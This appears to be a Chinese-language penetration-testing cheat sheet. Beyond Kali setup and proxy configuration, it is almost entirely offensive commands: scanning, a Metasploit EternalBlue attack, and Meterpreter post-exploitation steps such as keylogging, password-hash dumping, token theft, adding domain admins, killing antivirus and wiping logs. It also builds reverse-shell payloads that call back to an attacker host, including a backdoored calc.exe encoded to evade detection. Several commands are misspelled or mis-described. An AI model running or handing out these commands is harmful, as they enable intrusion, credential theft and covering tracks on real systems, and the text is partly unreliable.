kali
---

docker pull kalilinux/kali-rolling

docker run -t -i kalilinux/kali-rolling /bin/bash

aliyun 阿里云 

deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 

deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 

ustc 中科大 

deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 

deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 

tsinghua 清华

deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free

deb-src http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free

浙大源

deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free

deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free

apt install hping3

apt-get install metasploit-framework

apt-get install kali-linux-all	

---

agent

proxychains

sudo proxychains ping www.baidu.com

privoxy

修改配置文件/etc/privoxy/config

修改listen-address 127.0.0.1:11080

forward-socks5 / 127.0.0.1:11080 . 

forward baidu.com .

export http_proxy="127.0.0.1:8118"

export https_proxy="127.0.0.1:8118"

export ftp_proxy="127.0.0.1:8118"

---

ceshi 

1、隐藏身份：VPN，国外代理池、Tor，肉鸡、docker、虚拟机、

2、信息收集：站长查询站点库、、备案站、社工库、谷歌、邮箱、手机、域名、注册信息、robots泄露、Shodan、工具（Nmap、Zmap、Webscan、Hackmall、Sqlmap、msf，whatweb，nikto，w3af，nc）、历史漏洞库exploitdb

3、系统漏洞（Systeminfo、uname -a），web漏洞、数据库漏洞、弱口令burp、

4、社会工程：

5、后渗透metasploit、empire、cobalt strike

6、清理痕迹

---
信息收集

nmap -Ss  -p 80-88 -v 1.1.1.1	扫描端口

nmap -sS 10.x.x.x //usually

nmap -A -O -sV -p 443  --script=vuln 10.x.x.x //vuln

Masscan 10.11.0.0/16 –top-ports 100 > results.txt

fping -a -g 192.168.169.0/24

hping3 172.28.1.1 -S -V -c 100 -p 80


---
字典

路径：/usr/share/wordlists/

---
metasploit

进入框架：msfconsole

    使用search命令查找相关漏洞： search  ms17-010

    使用use进入模块:  use exploit/windows/smb/ms17_010_eternalblue

    使用info查看模块信息： info

    设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp

    查看模块需要配置的参数：show options

    设置参数：set  RHOST  192.168.125.138

    攻击：exploit /  run

    后渗透阶段
    
exploit漏洞利用模块路径：/usr/share/metasploit-framework/modules/exploits

payload模块路径：/usr/share/metasploit-framework/modules/payloads

search scanner type:auxiliary 搜索

auxiliary/scanner/ftp/ftp_version        #发现内网ftp服务，基于默认21端口

auxiliary/scanner/ssh/ssh_version        #发现内网ssh服务，基于默认22端口

auxiliary/scanner/telnet/telnet_version  #发现内网telnet服务，基于默认23端口

auxiliary/scanner/dns/dns_amp            #发现dns服务，基于默认53端口

auxiliary/scanner/http/http_version      #发现内网http服务，基于默认80端口

auxiliary/scanner/http/title             #探测内网http服务的标题

auxiliary/scanner/smb/smb_version        #发现内网smb服务，基于默认的445端口

use auxiliary/scanner/mssql/mssql_schemadump  #发现内网SQLServer服务,基于默认的1433端口

use auxiliary/scanner/oracle/oracle_hashdump  #发现内网oracle服务,基于默认的1521端口 

auxiliary/scanner/mysql/mysql_version    #发现内网mysql服务，基于默认3306端口

auxiliary/scanner/rdp/rdp_scanner        #发现内网RDP远程桌面服务，基于默认3389端口

auxiliary/scanner/redis/redis_server     #发现内网Redis服务，基于默认6379端口

auxiliary/scanner/db2/db2_version        #探测内网的db2服务，基于默认的50000端口

auxiliary/scanner/netbios/nbname         #探测内网主机的netbios名字

auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(1-10000)

auxiliary/scanner/portscan/syn           #基于syn进行端口扫描

auxiliary/scanner/portscan/ack           #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口

search -S auxiliary ssh
Metasploit扫描

msf > nmap -v -sV 192.168.1.111　

show exploits

列出metasploit框架中所有的渗透攻击模块

show payloads

列出metasploit框架中所有的攻击载荷

show auxiliary

列出metasploit框架中所有的辅助攻击模块

search name

查找metasploit框架中渗透攻击或者其他模块

info

展示出制定渗透攻击或模块的相关信息

use name

装载一个渗透攻击或模块

LHOST

本地可以让目标主机链接的IP地址，如果目标主机和自己不在同一个局域网内时，就需要你的公共IP地址，特别为反弹式shell使用

RHOST

远程主机或目标主机

set function

设置配置参数

setg function

以全局方式设置特定的配置参数

show options

列出某个渗透攻击或模块中所有的配置参数

show targets

列出渗透攻击所支持的目标平台

set target num

指定你所知道的目标的操作系统以及补丁版本类型

set PAYLOAD payload

指定想要使用的攻击载荷

show advanced

列出高级选项

set autorunscript migrate -f

在渗透攻击完成后，将自动迁移到另一个进程

check

检测目标是否对选定渗透攻击存在相应安全漏洞

exploit

执行渗透攻击或模块来攻击目标

exploit -j

后台进行攻击目标

exploit -z

渗透攻击成功后不与会话进行交互

exploit -e enconder

制定使用的攻击载荷编码方式（例如：exploit -e shikata_ga_nai)

exploit -h

列出exploit命令的帮助信息

sessions -l

列出可用的交互会话

sessions -l -v

列出可用的交互会话，以及会话的详细信息，例如：攻击系统时使用了哪个安全漏洞

sessions -s script

在所有活跃的Meterpreter会话中运行一个特定的Meterpreter脚本

sessions -K

杀死所有活跃的交互会话

sessions -c cmd

在所有活跃的Meterpreter会话上执行一个命令

sessions -u sessionID


search scanner type:auxiliary 

升级一个普通的win 32 shell到Meterpreter shell

db_creat name

创建一个数据库驱动攻击所要用的数据库（例如：db_creat autopwn)

db_connect name 

创建并连接一个数据库驱动攻击所要用的数据库（例如：db_connect autopwn)

db_nmap

利用nmap并把扫描数据存储到数据库中（支持nmap的普通语法）

db_autopwn -p -r -e

对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹shell

db_destroy

删除当前数据库

db_destory user:password@host:port/datebase

使用高级选项来删除数据库

二、Meterpreter命令
help

打开使用帮助

run scriptname

运行Meterpreter脚本，在scripts/meterpreter目录下查看所有脚本名

sysinfo

列出受控主机的系统信息

ls

列出主机的文件和文件夹信息

use priv

加载特权提升拓展模块，来扩展Meterpreter库

ps

显示所有运行进程以及关联的用户账户

migrate PID

迁移到一个指定的进程ID（PID号可通过ps命令从目标主机上获得）

use incognito

加载incognito功能（用来盗窃目标主机的令牌或是假冒用户）

list_tokens -g

列出目标主机用户的可用令牌

list_tokens -g

列出目标主机用户组的可用令牌

impersonate_token DOMAIN_NAME\\USERNAME

假冒目标主机上的可用令牌

steal_token PID

盗窃给定进程的可用令牌并进行令牌假冒

drop_token

停止假冒当前令牌

getsystem

通过各种攻击向量来提升系统用户权限

shell

以所有可用令牌来运行一个交互的shell

execute -f cmd.exe -i

执行cmd.exe命令并进行交互

execute -f cmd.exe -i -t

以所有可用令牌来执行cmd命令

execute -f cmd.exe -i -H -t

以所有可用令牌来执行cmd命令，并隐藏该进程

rev2self

回到控制目标主机的初始用户账户下

reg command

在目标主机注册表中进行交互，创建，删除，查询等操作

setdesktop number

切换到另一个用户界面

screenshot

截屏

upload file

向目标主机上传文件

download file

从目标主机上下载文件

keyscan_start

针对远程目标主机开启键盘记录功能

keyscan_dump

存储目标主机上捕获的键盘记录

keyscan_stop

停止针对目标主机的键盘记录

getprivs

尽可能多的获取目标主机上的特权

uictl enable keyboard/mouse

接管目标主机的键盘和鼠标

background

将你当前的Meterpreter shell转为后台执行

hashdump

导出目标主机中的口令哈希值

use sniffer

加载嗅探模块

sniffer_interfaces

列出目标主机所有开放的网络接口

sniffer_dump interfaceID pcapname

在目标主机上启动嗅探

sniffer_start interfaceID pcaket-buffer

在目标主机上针对特定范围的数据包缓冲区启动嗅探

sniffer_stats interfaceID 

获取正在实施嗅探网络接口的统计数据

sniffer_stop interfaceID 

停止嗅探

add_user username password -h ip

在远程目标主机上添加一个用户

add_group_user "Domain Admins" username -h ip

将用户添加到目标主机的域管理员组中

clearv

清除目标主机上的日志记录

timestomp

修改文件属性，例如修改文件的创建时间（反取证调查）

reboot

重启目标主机

三、MSF payload命令
msfpayload -h

MSFpayload的帮助信息

msfpayload windows/meterpreter/bind_tcp O

列出攻击载荷的配置项（任何攻击载荷都可以配置）

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X > payload.exe

创建一个Meterpreter的reverse_tcp攻击载荷，回连到192.168.1.5的443端口，将其保存为payload.exe的Windows可执行程序

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R > payload.raw

生成原始格式的文件，该文件将在MSFencode中使用。

msfpayload windows/meterpreter/bind_tcp LHOST=192.168.1.5 LPORT=443 C > payload.c

生成C格式的shellcode

msfpayload windows/meterpreter/bind_tcp LHOST=192.168.1.5 LPORT=443 J > payload.java

生成以%u编码方式的JavaScript语言字符串

四、MSFencode命令
msfencode -h

帮助信息

msfencode -l

列出所有可用的编码器

msfencode -t (c,elf,exe,java,js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho)

显示编码缓冲区的格式

msfencode -i payload.raw -o encoded_payload.exe -e -x86/shikata_ga_nai -c 5 -t exe

使用shikata_ga_nai编码器对payload.raw文件进行5次编码，然后导出一encoded_payload.exe文件

msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/_countdown -c -5 -t raw | msfencode -e x86/shikata_ga_nai -c -5 -t exe -o multi-encoded_payload.exe

创建一个经过多种编码格式嵌套编码的攻击载荷

msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c

创建一个纯字母数字的shellcode，由ESI寄存器指向shellcode，以c语言格式输出。

五、MSFcli命令
msfcli | grep exploit

仅列出渗透攻击模块

msfcli | grep exploit/windows

仅列出与windows相关的渗透攻击模块

msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E

对172.16.32.142发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在443端口进行监听

六、Metasploit高级忍术
msfpayload windows/meterpreter/bind_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode  -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c -7 -t exe

创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5主机443端口上，使用calc.exe作为载荷后门程序，让载荷执行流一直运行在被攻击的应用程序中，最后生成以.shikata_ga_nai编码器编码后的攻击载荷可执行程序payload.exe

msfpayload windows/meterpreter/bind_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c -7 -t exe

创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5主机443端口上，使用calc.exe作为载荷后门程序，不让载荷执行流一直运行在被攻击的应用程序中，同时在攻击载荷执行后也不会在目标主机上弹出任何信息。这种配置非常有效，当你利用浏览器漏洞控制了远程主机，并不想让计算器程序打开呈现在目标用户面前。同样，最后生成以.shikata_ga_nai编码器编码后的攻击载荷可执行程序payload.exe

msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -x calc.exe -k- -o payload.exe -e x86/shikata_ga_nai -c -7 -t exe && msfcli multi/handler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E

创建一个raw格式的bind_tcp模式的Meterpreter攻击载荷，编码7次，输出payload.exe，同时开启多路监听方式

七、MSFvenom
msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai LHOST=172.14.1.32 LPORT=443 > msf.exe

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.103 lport=4444 -f exe -o back.exe

创建和编码攻击载荷

八、Meterpreter后渗透攻击阶段命令
在windows主机上提权

meterpreter > use priv

meterpreter > getsystem

在一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中

meterpreter > ps

meterpreter > steal_token 1784

meterpreter > shell

从SAM数据库中导出密码的哈希值

meterpreter > use priv

meterpreter > getsystem

meterpreter > hashdump

提示：在windows8中，若getsystem命令和hashdump命令抛出异常，则需要迁移到一个以system系统权限运行的程序中

自动迁移到一个独立进程

meterpreter > run migrate

通过Meterpreter的killav脚本杀死目标主机上运行的杀毒软件进程

meterpreter > run killav

针对一个特定的进程捕获目标主机上的键盘记录

meterpreter > ps

meterpreter > migrate 1436

meterpreter > keyscan_start

meterpreter > keyscan_dump

meterpreter > keyscan_stop

使用匿名方式来冒充管理员

meterpreter > use incognito

meterpreter > list_tokens -u

meterpreter > use priv

meterpreter > getsystem

meterpreter > list_tokens -u

meterpreter > impersonate_token INAZSEURITY\\Adminstrator

查看目标主机上采取了哪些防护措施，列出帮助菜单，关闭防火墙以及其他我们发现的防护措施

meterpreter > run getcountermeasure

meterpreter > run getcountermeasure -h

meterpreter > run getcountermeasure -d -k

识别被控制的主机是否为虚拟机

meterpreter > run checkvm

在Meterpreter会话中使用shell

meterpreter > shell

获取目标主机的图形界面

meterpreter > run vnc

使正在运行的Meterpreter界面在后台运行

meterpreter > backgroud

绕过windows用户账户控制UAC机制

meterpreter > run post/windows/escalate/bypassuac

导出os-x系统口令哈希值

meterpreter > run post/osx/gather/hashdump

导出linux系统口令哈希值

meterpreter > run post/linux/gather/hashdump


